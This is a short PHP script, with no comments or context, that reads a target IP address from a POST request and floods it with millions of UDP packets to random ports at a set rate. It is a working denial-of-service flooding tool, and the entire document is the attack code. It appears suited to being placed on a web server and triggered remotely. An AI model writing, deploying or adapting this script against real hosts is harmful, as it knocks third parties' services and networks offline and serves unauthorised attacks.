<?
$host = $_POST['ip'];
    $pps = 5000;
    $tune = 125;
    $uslp = (1000000 / $pps) - $tune;
    if($uslp < 0)
    $uslp = 0;
    for ($i=6500000; $i > 0 ; $i--) {
    	$port = rand(1025, 65535);
    	$fp = fsockopen('udp://'.$host,$port,$errno,$errstr,5);
    	fwrite($fp, $i);
    	fclose($fp);
    	usleep($uslp);
    }
 ?>
